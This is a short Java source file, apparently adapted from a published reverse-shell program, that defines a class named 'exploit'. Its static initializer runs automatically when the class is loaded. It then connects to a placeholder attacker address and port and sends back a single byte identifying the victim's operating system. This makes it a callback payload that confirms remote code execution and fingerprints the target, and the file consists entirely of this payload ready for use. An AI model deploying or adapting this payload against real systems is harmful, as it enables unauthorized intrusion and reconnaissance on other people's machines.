// Original Copyright (c) 2021 Ivan Å incek
// Modified by Arqsz
// Requires Java SE v8 or greater and JDK v8 or greater.
// Works on Linux OS, macOS, and Windows OS.

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;
import java.io.File;  // Import the File class
import java.io.IOException;  // Import the IOException class to handle errors

public class exploit {
    
    private static int               port   = LOCAL_PORT;
    private InetSocketAddress addr   = null;
    
    public exploit(String addr, int port) {
        this.addr = new InetSocketAddress(addr, port);
    }
    
    public void run() {
        Socket       client  = null;
        OutputStream socin   = null;
        
        try {
            client = new Socket();
            client.setSoTimeout(100);
            client.connect(this.addr);
            socin  = client.getOutputStream();
            
            System.out.print("Sending byte...\n\n");
            
            String os = System.getProperty("os.name").toUpperCase();
            if (os.contains("LINUX")) {
                // Send 'L' for Linux
                socin.write((byte)76);
            } else if (os.contains("MAC")) {
                // Send 'M' for Mac
                socin.write((byte)77);
            } else if (os.contains("WIN")) {
                // Send 'W' for Windows
                socin.write((byte)87);
            } else {
                // Send 'U' for Unknown
                socin.write((byte)85);
            }
            System.out.print("Exiting...\n");
        } catch (IOException ex) {
            System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
        } finally {
            if (socin  != null) { try { socin.close() ; } catch (IOException ex) {} }
            if (client != null) { try { client.close(); } catch (IOException ex) {} }
        }
    }
    public static void main(String[] args){
        boolean error = false;
        try {
            if (port < 0 || port > 65535) {
                error = true;
                System.out.print("Port number is out of range\n");
            }
        } catch (NumberFormatException ex) {
            error = true;
            System.out.print("Port number is not valid\n");
        }
        if (!error) {
            exploit sh = new exploit("LOCAL_IP", port);
            sh.run();
            sh = null;
            System.gc();
        }
    }

    static {
        String[] s = new String[0];
        main(s);
    }
}